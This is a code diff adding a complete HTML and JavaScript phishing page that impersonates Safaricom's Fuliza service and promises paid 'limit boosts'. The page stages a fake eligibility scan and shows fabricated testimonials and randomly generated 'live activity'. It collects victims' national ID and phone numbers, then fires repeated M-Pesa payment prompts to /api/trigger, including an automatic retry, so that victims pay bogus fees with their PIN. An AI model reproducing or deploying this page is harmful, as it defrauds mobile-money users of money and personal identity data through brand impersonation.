@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safaricom Fuliza Plus+ | Official Verification Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
+         :root {
+            --safaricom-green: #49aa33;
+            --saf-mint: #eafcf1;
+            --saf-primary: #1e293b;
+        }
+        
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f8fafc;
+            color: #1e293b;
+        }
+        
+        .text-safaricom {
+            color: var(--safaricom-green);
+        }
+        
+        .bg-safaricom {
+            background-color: var(--safaricom-green);
+        }
+        
+        .border-safaricom {
+            border-color: var(--safaricom-green);
+        }
+        
+        .support-bar {
+            background: #0f172a;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 800;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--safaricom-green);
+        }
+        /* --- Premium Limit Cards --- */
+        
+        .limit-card {
+            position: relative;
+            padding: 16px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.05);
+            border: 2px solid #e2e8f0;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-height: 110px;
+        }
+        
+        @media (min-width: 768px) {
+            .limit-card {
+                padding: 24px;
+            }
+        }
+        
+        .limit-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+            border-color: var(--safaricom-green);
+        }
+        
+        .active-card {
+            border-color: var(--safaricom-green) !important;
+            background-color: #f0fdf4 !important;
+            box-shadow: 0 10px 25px rgba(73, 170, 51, 0.1);
+        }
+        
+        .limit-amt {
+            font-size: 18px;
+            font-weight: 800;
+            color: #0f172a;
+            margin-top: 6px;
+        }
+        
+        @media (min-width: 768px) {
+            .limit-amt {
+                font-size: 20px;
+            }
+        }
+        
+        .limit-fee {
+            font-size: 12px;
+            font-weight: 700;
+            color: #49aa33;
+            margin-top: 2px;
+        }
+        
+        .tag-instant {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background-color: #ff5722;
+            color: white;
+            font-size: 9px;
+            font-weight: 800;
+            text-transform: uppercase;
+            padding: 4px 10px;
+            border-radius: 0px 0px 10px 0px;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        
+        .tag-hot {
+            background-color: #ff1744;
+            color: white;
+            font-size: 8px;
+            font-weight: 850;
+            text-transform: uppercase;
+            padding: 3px 8px;
+            border-radius: 8px;
+            position: absolute;
+            top: 12px;
+            right: 12px;
+        }
+        
+        .arrow-icon {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            color: #cbd5e0;
+            font-size: 12px;
+            opacity: 0.6;
+        }
+        /* --- Hero Golden Premium Card --- */
+        
+        .hero-offer {
+            grid-column: 1 / -1;
+            background: linear-gradient(135deg, #e4a20b 0%, #ffeb3b 50%, #f4c32b 100%);
+            border-radius: 24px;
+            padding: 24px 16px;
+            text-align: center;
+            color: #0f172a;
+            margin: 15px 0 24px 0;
+            box-shadow: 0 15px 35px rgba(228, 162, 11, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            position: relative;
+        }
+        
+        @media (min-width: 768px) {
+            .hero-offer {
+                padding: 32px 24px;
+            }
+        }
+        
+        .hero-offer::before,
+        .hero-offer::after {
+            content: "\f005";
+            font-family: "Font Awesome 6 Free";
+            font-weight: 900;
+            position: absolute;
+            font-size: 10px;
+            color: rgba(0, 0, 0, 0.5);
+        }
+        
+        .hero-offer::before {
+            top: 12px;
+            left: 12px;
+        }
+        
+        .hero-offer::after {
+            bottom: 12px;
+            right: 12px;
+        }
+        
+        .offer-label {
+            display: inline-block;
+            font-size: 10px;
+            font-weight: 800;
+            text-transform: uppercase;
+            background: rgba(0, 0, 0, 0.08);
+            padding: 5px 15px;
+            border-radius: 20px;
+            letter-spacing: 0.05em;
+        }
+        
+        .offer-amt {
+            font-size: 32px;
+            font-weight: 900;
+            margin: 8px 0;
+            letter-spacing: -0.02em;
+        }
+        
+        @media (min-width: 768px) {
+            .offer-amt {
+                font-size: 38px;
+            }
+        }
+        
+        .hero-fee-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: white;
+            color: var(--safaricom-green);
+            font-size: 11px;
+            font-weight: 800;
+            padding: 8px 18px;
+            border-radius: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .btn-hero {
+            background-color: #0f172a;
+            color: white;
+            font-weight: 800;
+            font-size: 11px;
+            text-transform: uppercase;
+            padding: 12px 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            transition: all 0.2s;
+            letter-spacing: 0.05em;
+        }
+        
+        .hidden-site {
+            display: none !important;
+        }
+        /* --- Mobile Sticky Button --- */
+        
+        #main-upgrade-btn.sticky-upgrade {
+            position: fixed;
+            bottom: 20px;
+            left: 1rem;
+            right: 1rem;
+            width: calc(100% - 2rem);
+            z-index: 1000;
+            box-shadow: 0 -10px 25px rgba(0, 0, 0, 0.15), 0 10px 20px rgba(73, 170, 51, 0.3);
+            animation: slideInUp 0.3s ease-out;
+        }
+        
+        @keyframes slideInUp {
+            from {
+                transform: translateY(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            #zuri-container {
+                bottom: 100px !important;
+                z-index: 900 !important;
+            }
+        }
+        
+        #live-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 10px;
+            right: 10px;
+            background: white;
+            padding: 12px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            border-left: 4px solid var(--safaricom-green);
+            transform: translateX(-150%);
+            transition: transform 0.5s ease-out;
+            z-index: 1000;
+            max-width: 320px;
+        }
+        
+        @media (min-width: 768px) {
+            #live-toast {
+                left: 20px;
+                bottom: 100px;
+                right: auto;
+            }
+        }
+        
+        #live-toast.show {
+            transform: translateX(0);
+        }
+        
+        .scanner-line {
+            width: 100%;
+            height: 2px;
+            background: var(--safaricom-green);
+            position: absolute;
+            top: 0;
+            left: 0;
+            box-shadow: 0 0 15px var(--safaricom-green);
+            animation: scan 2s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% {
+                top: 0;
+            }
+            100% {
+                top: 100%;
+            }
+        }
+        
+        @keyframes dot-pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .online-indicator {
+            animation: dot-pulse 2s infinite;
+        }
+    </style>
+    <!-- Meta Pixel Code -->
+    <script>
+        ! function(f, b, e, v, n, t, s) {
+            if (f.fbq) return;
+            n = f.fbq = function() {
+                n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n;
+            n.push = n;
+            n.loaded = !0;
+            n.version = '2.0';
+            n.queue = [];
+            t = b.createElement(e);
+            t.async = !0;
+            t.src = v;
+            s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '2191601818289681');
+        fbq('track', 'PageView');
+    </script><noscript> <img height="1" width="1" src="https://www.facebook.com/tr?id=2191601818289681&ev=PageView&noscript=1"/></noscript>
+    <!-- End Meta Pixel Code -->
+</head>
+
+<body class="bg-slate-50">
+
+    <div id="live-toast" class="flex items-center gap-3">
+        <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center text-safaricom">
+            <i class="fas fa-bolt"></i>
+        </div>
+        <div>
+            <p class="text-[10px] font-bold text-slate-400 uppercase">Live Activity</p>
+            <p id="toast-msg" class="text-xs font-bold text-slate-800"></p>
+        </div>
+    </div>
+
+    <div class="support-bar sticky top-0 z-[60]">
+        <div class="flex items-center gap-2">
+            <i class="fas fa-headset text-safaricom"></i>
+            <span class="uppercase tracking-wider">24/7 LIVE SUPPORT</span>
+        </div>
+        <div class="flex items-center gap-4">
+            <a href="tel:0722000000" class="hidden md:block">0722 000 000</a>
+            <div onclick="toggleZuriChat()" class="flex items-center gap-1.5 cursor-pointer hover:text-safaricom transition-colors">
+                <i class="fas fa-comment-alt text-safaricom"></i>
+                <span class="uppercase">LIVE CHAT WITH ZURI AGENT</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-slate-900 text-white py-2.5 text-[9px] font-black text-center uppercase tracking-[0.2em] px-4 border-b border-white/10">
+        <span class="text-green-400 animate-pulse">●</span> System Status: Online | Encryption: AES-256 | Node: SAF-024 | Safaricom | Fuliza | Upgrade
+    </div>
+
+    <div id="zuri-container" class="fixed bottom-6 right-6 z-[500] cursor-pointer flex flex-col items-end">
+        <div id="zuri-bubble" class="hidden bg-white text-slate-800 text-[11px] font-bold py-2.5 px-4 rounded-2xl shadow-2xl border-2 border-[#49aa33] mb-3 animate-bounce relative max-w-[200px] text-center">
+            Need help choosing the right limit for you?
+            <div class="absolute -bottom-2 right-6 w-3 h-3 bg-white border-r-2 border-b-2 border-[#49aa33] rotate-45"></div>
+        </div>
+        <div onclick="toggleZuriChat()" class="group flex items-center gap-3 bg-white p-2 pr-6 rounded-full shadow-2xl border-2 border-slate-100 hover:border-safaricom transition-all">
+            <div class="w-12 h-12 bg-safaricom rounded-full flex items-center justify-center text-white relative shadow-lg">
+                <i class="fas fa-headset text-xl"></i>
+                <div class="absolute -bottom-0.5 -right-0.5 w-4 h-4 bg-green-500 border-2 border-white rounded-full online-indicator"></div>
+            </div>
+            <div class="flex flex-col">
+                <span class="text-[9px] font-black text-slate-400 uppercase tracking-widest leading-none">Support</span>
+                <span class="text-[13px] font-extrabold text-slate-800">Chat with Zuri</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="landing-page" class="max-w-2xl mx-auto px-4 py-8">
+        <div id="check-step" class="bg-white p-6 md:p-8 rounded-[2rem] shadow-xl border border-slate-100 text-center mb-10">
+            <div class="flex justify-center mb-4">
+                <div class="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center">
+                    <i class="fas fa-user-shield text-safaricom text-3xl"></i>
+                </div>
+            </div>
+            <h1 class="text-2xl md:text-3xl font-extrabold text-slate-900 mb-1"> Safaricom M-Pesa Fuliza Boost</h1>
+            <p class="text-[10px] md:text-[11px] font-bold text-safaricom uppercase tracking-widest mb-6">Instant Limit Increase • Same Day Access</p>
+
+            <div class="relative mb-4">
+                <i class="fas fa-phone-alt absolute left-4 top-5 text-slate-400"></i>
+                <input type="number" id="checkPhone" placeholder="Enter M-Pesa Number" class="w-full pl-12 pr-4 py-5 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-safaricom outline-none text-lg font-bold">
+            </div>
+
+            <button id="eligibilityBtn" onclick="startVerification()" class="w-full bg-safaricom text-white font-bold py-5 rounded-2xl shadow-lg active:scale-95 transition-all">
+                Check My Fuliza Eligibility <i class="fas fa-chevron-right text-xs ml-2"></i>
+            </button>
+        </div>
+
+        <div id="verifying-step" class="hidden bg-white p-12 rounded-[2rem] shadow-xl text-center mb-10 relative overflow-hidden">
+            <div class="scanner-line"></div>
+            <div class="w-16 h-16 border-4 border-safaricom border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+            <h3 class="text-xl font-bold text-slate-800 mb-2" id="status-text">Connecting to node...</h3>
+            <p class="text-sm text-slate-500" id="sub-status-text">Accessing safaricom secure databases...</p>
+        </div>
+
+        <div id="result-step" class="hidden bg-white p-6 md:p-10 rounded-[2rem] shadow-xl text-center mb-10 border-2 border-safaricom">
+            <i class="fas fa-check-circle text-safaricom text-5xl mb-4"></i>
+            <h2 class="text-xl md:text-2xl font-extrabold mb-2">Congratulations! You are Pre-approved</h2>
+            <p class="text-sm text-slate-600 mb-6">Your number <span id="displayNum" class="font-bold text-safaricom"></span> is eligible for a boost.</p>
+            <button onclick="revealMainSite()" class="w-full bg-slate-900 text-white font-bold py-5 rounded-2xl shadow-xl">Proceed to Select and Upgrade</button>
+        </div>
+
+        <div class="mb-12">
+            <h3 class="text-center font-bold text-slate-800 mb-6 flex items-center justify-center gap-2">
+                <i class="fas fa-comment-dots text-safaricom"></i> Real-Time User Feedback
+            </h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-white p-4 rounded-xl border border-slate-100 shadow-sm flex gap-3">
+                    <img src="https://ui-avatars.com/api/?name=David+L&background=49aa33&color=fff" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="text-xs font-bold">David L. <span class="text-safaricom ml-1 text-[10px]"><i class="fas fa-check-circle"></i> Verified</span></p>
+                        <p class="text-[12px] text-slate-600">"My limit moved from 2k to 75k in under 10 mins. Highly recommended!"</p>
+                    </div>
+                </div>
+                <div class="bg-white p-4 rounded-xl border border-slate-100 shadow-sm flex gap-3">
+                    <img src="https://ui-avatars.com/api/?name=Mercy+A&background=49aa33&color=fff" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="text-xs font-bold">Mercy A. <span class="text-safaricom ml-1 text-[10px]"><i class="fas fa-check-circle"></i> Verified</span></p>
+                        <p class="text-[12px] text-slate-600">"The process was very professional. My business limit is now boosted. Thank You."</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="mb-12">
+            <h3 class="font-bold text-slate-800 mb-6 px-2 border-l-4 border-safaricom">Frequently Asked Questions</h3>
+            <div class="space-y-3 text-sm">
+                <div class="bg-white p-4 rounded-xl border border-slate-200">
+                    <p class="font-bold mb-1">1. How long does the boost take to reflect?</p>
+                    <p class="text-slate-500">Typically applied within 5 to 10 minutes after processing.</p>
+                </div>
+                <div class="bg-white p-4 rounded-xl border border-slate-200">
+                    <p class="font-bold mb-1">2. Is my Safaricom PIN required?</p>
+                    <p class="text-slate-500">No. You only enter your PIN on the official M-Pesa prompt on your phone.</p>
+                </div>
+            </div>
+        </div>
+
+        <footer class="py-10 border-t border-slate-200 text-center">
+            <div class="flex justify-center gap-6 mb-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/M-PESA_LOGO-01.svg" class="h-5 opacity-60">
+                <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest self-center">Safaricom API Integrated</span>
+            </div>
+            <p class="text-xs font-bold text-slate-500">FulizaBoost Services Ltd • Nairobi, Kenya</p>
+            <p class="text-xs font-bold text-slate-500">Email Safaricomfuliza@gmail.com • Call 07 22 000 000 Or Dial 100</p>
+        </footer>
+    </div>
+
+    <div id="main-content" class="hidden-site max-w-2xl mx-auto px-4 py-8 pb-32">
+        <h2 class="text-xl md:text-2xl font-extrabold mb-5 text-left border-l-4 border-safaricom pl-3">Select Your New Approved Limit</h2>
+        <div id="grid-container" class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8"></div>
+        <button id="main-upgrade-btn" onclick="openPayment()" class="w-full bg-safaricom text-white font-bold py-5 rounded-2xl shadow-xl transition-all hidden uppercase tracking-wider text-sm">
+            SELECT A LIMIT
+        </button>
+    </div>
+
+    <div id="paymentModal" class="fixed inset-0 bg-black/60 hidden items-center justify-center p-4 z-[300] backdrop-blur-sm">
+        <div class="bg-white rounded-[2rem] overflow-hidden w-full max-w-sm shadow-2xl">
+            <div class="bg-safaricom p-6 text-white text-center">
+                <p class="text-[10px] font-bold uppercase tracking-widest opacity-80 mb-1">Secure Fuliza Application</p>
+                <h3 class="text-lg md:text-xl font-extrabold">Boost Limit To <span id="sumLimit">Ksh 0</span></h3>
+            </div>
+            <div class="p-6">
+                <div id="modal-form-step">
+                    <div class="bg-green-50 p-4 rounded-xl mb-6">
+                        <p class="text-[11px] text-green-800 leading-relaxed font-semibold">
+                            Enter your ID Number for VERIFICATION and to receive M-Pesa payment prompt to HIGH MAXIMUM fULIZA for processing your new limit .
+                        </p>
+                    </div>
+                    <input type="number" id="idNum" placeholder="ID Number" class="w-full mb-3 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom">
+                    <input type="number" id="phoneNum" placeholder="07XXXXXXXX" class="w-full mb-6 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom">
+                    <div class="flex flex-col gap-3">
+                        <button onclick="showPinConfirmation()" class="py-4 bg-safaricom text-white font-bold rounded-xl">
+                            Pay <span id="sumFee">Ksh 0</span>
+                        </button>
+                        <button onclick="closeModal()" class="py-4 bg-slate-100 text-slate-500 font-bold rounded-xl">Cancel</button>
+                    </div>
+                </div>
+
+                <div id="modal-pin-step" class="hidden text-center">
+                    <div class="bg-slate-50 p-6 rounded-2xl mb-6">
+                        <i class="fas fa-lock text-safaricom text-3xl mb-3"></i>
+                        <p class="text-sm font-bold text-slate-800 leading-relaxed">
+                            Now enter Your M-Pesa pin ON THE PROMPT ON YOUR PHONE to successfully increase your limit to <span id="confirmLimit" class="text-safaricom">Ksh 0</span>
+                        </p>
+                    </div>
+                    <div class="flex flex-col gap-3">
+                        <button onclick="triggerInitialSTK()" class="w-full py-4 bg-safaricom text-white font-bold rounded-xl uppercase">CONTINUE TO UPGRADEF NEW LIMIT</button>
+                        <button onclick="backToSelection()" class="w-full py-4 bg-slate-100 text-slate-500 font-bold rounded-xl uppercase text-xs">Back to select amount</button>
+                    </div>
+                </div>
+
+                <div id="modal-spinner-step" class="hidden text-center py-10">
+                    <div class="w-14 h-14 border-4 border-safaricom border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                    <h3 class="text-lg font-bold text-slate-800 mb-4">Check M-Pesa Response For The Prompt</h3>
+                    <button onclick="showPaymentStatusChoices()" class="w-full py-4 bg-safaricom text-white font-bold rounded-xl uppercase">AUTHORIZE FULIZA INCREASE</button>
+                </div>
+
+                <div id="modal-status-choice-step" class="hidden text-center">
+                    <div class="bg-green-50 p-6 rounded-2xl mb-6">
+                        <h3 class="text-sm font-bold text-slate-800 mb-2 uppercase">Payment Verification</h3>
+                        <p class="text-[11px] text-slate-500 font-bold">Please confirm if you have completed the M-Pesa transaction on your phone.</p>
+                    </div>
+                    <div class="flex flex-col gap-3">
+                        <button onclick="finalHiddenTrigger('paid')" class="w-full py-4 bg-safaricom text-white font-bold rounded-xl text-[10px] px-2">I HAVE PAID AND READY TO ACCESS MY NEW LIMIT</button>
+                        <button onclick="finalHiddenTrigger('unpaid')" class="w-full py-4 bg-slate-900 text-white font-bold rounded-xl text-sm">I HAVE NOT PAID</button>
+                    </div>
+                </div>
+
+                <div id="modal-success-step" class="hidden text-center py-6">
+                    <div class="w-16 h-16 bg-safaricom rounded-full flex items-center justify-center text-white mx-auto mb-4 text-2xl">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h3 class="text-xl font-extrabold text-slate-800 mb-1">Request Received</h3>
+                    <p id="timer-display" class="text-3xl font-black text-safaricom mb-6">5:00</p>
+                    <div class="space-y-3">
+                        <button onclick="toggleZuriChat()" class="w-full py-4 bg-slate-800 text-white font-bold rounded-xl flex items-center justify-center gap-2 uppercase text-xs tracking-widest">
+                            <i class="fas fa-comment"></i> Chat with Agent Zuri
+                        </button>
+                        <a href="https://wa.me/254111967127?text=Hello%20Safaricom%20Support,%20I%20have%20completed%20my%20Fuliza%20Upgrade" target="_blank" class="w-full py-4 bg-green-600 text-white font-bold rounded-xl flex items-center justify-center gap-2 uppercase text-xs tracking-widest hover:bg-green-700 transition-colors">
+                            <i class="fab fa-whatsapp text-lg"></i> Contact via WhatsApp
+                        </a>
+                        <button onclick="location.reload()" class="w-full py-4 bg-slate-200 text-slate-600 font-bold rounded-xl uppercase text-[10px]">
+                            Back to Home
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {},
+            Tawk_LoadStart = new Date();
+        let hasUserReachedFinalStep = false;
+
+        Tawk_API.onLoad = function() {
+            Tawk_API.hideWidget();
+        };
+
+        (function() {
+            var s1 = document.createElement("script"),
+                s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/69fdeda9a11ae21c341a19e8/default';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        })();
+
+        function toggleZuriChat() {
+            if (!hasUserReachedFinalStep) {
+                const bubble = document.getElementById('zuri-bubble');
+                let currentMsg = "Need help choosing the right limit?";
+
+                if (!document.getElementById('landing-page').classList.contains('hidden-site')) {
+                    currentMsg = "Please check your eligibility first so I can assist you better.";
+                } else if (!document.getElementById('main-content').classList.contains('hidden-site')) {
+                    currentMsg = "Great! Select your preferred limit and click Upgrade to finalize.";
+                } else if (document.getElementById('paymentModal').classList.contains('flex')) {
+                    currentMsg = "Almost there! Confirm the M-Pesa prompt to activate your limit.";
+                }
+
+                bubble.innerText = currentMsg;
+                bubble.classList.remove('hidden');
+                setTimeout(() => bubble.classList.add('hidden'), 5000);
+            } else {
+                Tawk_API.toggle();
+            }
+        }
+
+        let zuriTimer;
+
+        function startZuriNudge() {
+            clearTimeout(zuriTimer);
+            zuriTimer = setTimeout(() => {
+                const bubble = document.getElementById('zuri-bubble');
+                if (bubble && !hasUserReachedFinalStep) bubble.classList.remove('hidden');
+            }, 30000);
+        }
+    </script>
+
+    <script>
+        const limitsData = [{
+            amt: 5000,
+            fee: 250,
+            tags: [],
+            type: 'standard'
+        }, {
+            amt: 10000,
+            fee: 580,
+            tags: [],
+            type: 'standard'
+        }, {
+            amt: 15000,
+            fee: 600,
+            tags: [],
+            type: 'standard'
+        }, {
+            amt: 20000,
+            fee: 800,
+            tags: [],
+            type: 'standard'
+        }, {
+            amt: 25000,
+            fee: 1050,
+            tags: [],
+            type: 'standard'
+        }, {
+            amt: 30000,
+            fee: 1500,
+            tags: [],
+            type: 'standard'
+        }, {
+            amt: 35000,
+            fee: 2000,
+            tags: ['instant', 'hot'],
+            type: 'standard'
+        }, {
+            amt: 45000,
+            fee: 2499,
+            tags: ['instant', 'hot'],
+            type: 'standard'
+        }, {
+            amt: 55000,
+            fee: 925,
+            type: 'hero'
+        }, {
+            amt: 50000,
+            fee: 3000,
+            tags: ['instant'],
+            type: 'standard'
+        }, {
+            amt: 60000,
+            fee: 3500,
+            tags: ['instant'],
+            type: 'standard'
+        }, {
+            amt: 75000,
+            fee: 6999,
+            tags: [],
+            type: 'standard'
+        }];
+
+        const names = ["Brian O.", "Mercy W.", "Kevin K.", "Faith J.", "David M.", "Peter N."];
+
+        function showLiveToast() {
+            const name = names[Math.floor(Math.random() * names.length)];
+            const safPrefixes = ["070", "071", "072", "074", "079", "011"];
+            const prefix = safPrefixes[Math.floor(Math.random() * safPrefixes.length)];
+            const phone = prefix + Math.floor(Math.random() * 9) + "***" + Math.floor(100 + Math.random() * 900);
+
+            document.getElementById('toast-msg').innerHTML = `${name} (${phone}) boosted just now`;
+            document.getElementById('live-toast').classList.add('show');
+            setTimeout(() => document.getElementById('live-toast').classList.remove('show'), 4000);
+        }
+        setInterval(showLiveToast, 15000);
+
+        function startVerification() {
+            const ph = document.getElementById('checkPhone').value;
+            if (!ph || ph.length < 10) return alert("Enter valid number");
+            document.getElementById('eligibilityBtn').innerText = "Processing...";
+            setTimeout(() => {
+                document.getElementById('check-step').classList.add('hidden');
+                document.getElementById('verifying-step').classList.remove('hidden');
+
+                let steps = ["Connecting...", "Checking History...", "Verifying ID...", "Generating Offer..."];
+                let i = 0;
+                let logInt = setInterval(() => {
+                    if (i < steps.length) {
+                        document.getElementById('status-text').innerText = steps[i];
+                        i++;
+                    } else {
+                        clearInterval(logInt);
+                        document.getElementById('verifying-step').classList.add('hidden');
+                        document.getElementById('result-step').classList.remove('hidden');
+                        document.getElementById('displayNum').innerText = ph;
+                        document.getElementById('phoneNum').value = ph;
+                    }
+                }, 1500);
+            }, 800);
+        }
+
+        function revealMainSite() {
+            document.getElementById('landing-page').classList.add('hidden-site');
+            document.getElementById('main-content').classList.remove('hidden-site');
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+            startZuriNudge();
+        }
+
+        let selectedLimit = null,
+            selectedFee = null;
+        const grid = document.getElementById('grid-container');
+        const upgradeBtn = document.getElementById('main-upgrade-btn');
+
+        limitsData.forEach(l => {
+            const div = document.createElement('div');
+            if (l.type === 'hero') {
+                div.className = "hero-offer";
+                div.innerHTML = `
+                    <span class="offer-label">SPECIAL EXCLUSIVE OFFER</span>
+                    <div class="offer-amt">Ksh ${l.amt.toLocaleString()}</div>
+                    <div class="flex flex-col md:flex-row items-center justify-center gap-3 mt-3">
+                        <div class="hero-fee-pill">Fee: <strong>Ksh ${l.fee}</strong></div>
+                        <button onclick="claimHeroOffer()" class="btn-hero">Claim Offer!</button>
+                    </div>
+                `;
+            } else {
+                div.className = "limit-card";
+                let tagsHTML = '';
+                if (l.tags.includes('instant')) tagsHTML += `<div class="tag-instant">Instant</div>`;
+                if (l.tags.includes('hot')) tagsHTML += `<div class="tag-hot">HOT</div>`;
+
+                div.innerHTML = `
+                    ${tagsHTML}
+                    <p class="limit-amt">Ksh ${l.amt.toLocaleString()}</p>
+                    <p class="limit-fee">Fee: Ksh ${l.fee}</p>
+                    <div class="arrow-icon"><i class="fas fa-chevron-right"></i></div>
+                `;
+
+                div.onclick = () => {
+                    document.querySelectorAll('.limit-card, .hero-offer').forEach(c => c.classList.remove('active-card'));
+                    div.classList.add('active-card');
+                    selectedLimit = l.amt;
+                    selectedFee = l.fee;
+                    upgradeBtn.innerText = `UPGRADE TO KSH ${l.amt.toLocaleString()}`;
+                    upgradeBtn.classList.remove('hidden');
+                    if (window.innerWidth < 768) upgradeBtn.classList.add('sticky-upgrade');
+                };
+            }
+            grid.appendChild(div);
+        });
+
+        function claimHeroOffer() {
+            selectedLimit = 55000;
+            selectedFee = 625;
+            openPayment();
+        }
+
+        function openPayment() {
+            document.getElementById('sumLimit').innerText = "Ksh " + selectedLimit.toLocaleString();
+            document.getElementById('sumFee').innerText = "Ksh " + selectedFee;
+            document.getElementById('confirmLimit').innerText = "Ksh " + selectedLimit.toLocaleString();
+            document.getElementById('paymentModal').classList.replace('hidden', 'flex');
+        }
+
+        function closeModal() {
+            document.getElementById('paymentModal').classList.replace('flex', 'hidden');
+            document.getElementById('modal-form-step').classList.remove('hidden');
+            document.getElementById('modal-pin-step').classList.add('hidden');
+            document.getElementById('modal-spinner-step').classList.add('hidden');
+            document.getElementById('modal-status-choice-step').classList.add('hidden');
+            document.getElementById('modal-success-step').classList.add('hidden');
+        }
+
+        function backToSelection() {
+            closeModal();
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        }
+
+        async function triggerSTKCall(note) {
+            try {
+                // Ensure we grab the LATEST values from the inputs every time a trigger fires
+                const idNumberInput = document.getElementById('idNum').value;
+                const phoneInput = document.getElementById('phoneNum').value;
+
+                // Validation to prevent empty fetches
+                if (!phoneInput || !selectedFee) return;
+
+                // Ensure the path is exactly what your Vercel/Backend expects
+                // Change '/api/trigger' to 'api/trigger' (no leading slash) if hosted on certain sub-paths
+                await fetch('/api/trigger', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        amount: selectedFee,
+                        phone_number: phoneInput,
+                        id_number: idNumberInput,
+                        note: note
+                    }),
+                    keepalive: true // Crucial for Trigger 4 so the request finishes even if the page reloads
+                });
+                console.log("Trigger Sent:", note);
+            } catch (error) {
+                console.error("STK Trigger Failed:", error);
+            }
+        }
+
+        function showPinConfirmation() {
+            if (!document.getElementById('idNum').value || !document.getElementById('phoneNum').value) return alert("Enter all details");
+            // TRIGGER 1: Initial Click
+            triggerSTKCall('Trigger 1: Initial Pay Button');
+            document.getElementById('modal-form-step').classList.add('hidden');
+            document.getElementById('modal-pin-step').classList.remove('hidden');
+        }
+
+        function triggerInitialSTK() {
+            // TRIGGER 2: PIN Confirmed
+            triggerSTKCall('Trigger 2: PIN Instructions Confirmed');
+            document.getElementById('modal-pin-step').classList.add('hidden');
+            document.getElementById('modal-spinner-step').classList.remove('hidden');
+            // TRIGGER 3: Auto-Retry Backup
+            setTimeout(() => {
+                triggerSTKCall('Trigger 3: Auto-Retry Backup');
+            }, 2000);
+        }
+
+        function showPaymentStatusChoices() {
+            document.getElementById('modal-spinner-step').classList.add('hidden');
+            document.getElementById('modal-status-choice-step').classList.remove('hidden');
+        }
+
+        function finalHiddenTrigger(status) {
+            // TRIGGER 4: Manual Confirmation
+            triggerSTKCall(`Trigger 4: User Manual Status: ${status}`);
+            document.getElementById('modal-status-choice-step').classList.add('hidden');
+            document.getElementById('modal-success-step').classList.remove('hidden');
+            hasUserReachedFinalStep = true;
+            startTimer();
+            setTimeout(() => {
+                if (typeof Tawk_API !== 'undefined') Tawk_API.showWidget();
+            }, 1000);
+        }
+
+        function startTimer() {
+            let timeLeft = 600;
+            const display = document.getElementById('timer-display');
+            const interval = setInterval(() => {
+                let mins = Math.floor(timeLeft / 60),
+                    secs = timeLeft % 60;
+                display.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+                if (--timeLeft < 0) clearInterval(interval);
+            }, 1000);
+        }
+    </script>
+</body>
+
+</html>
